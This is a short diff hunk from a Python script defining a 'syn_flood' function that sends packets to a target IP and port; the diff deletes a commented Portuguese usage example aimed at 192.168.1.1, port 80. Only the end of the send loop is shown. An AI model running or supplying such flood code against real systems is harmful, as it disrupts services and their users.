@@ -15,6 +15,3 @@ def syn_flood(target_ip, target_port, duration):
         send(packet, verbose=False)
 
     print("SYN Flood attack completed.")
-
-# Exemplo de Uso
-# syn_flood("192.168.1.1", 80, 60)  # IP do alvo, porta do alvo, duração em segundos
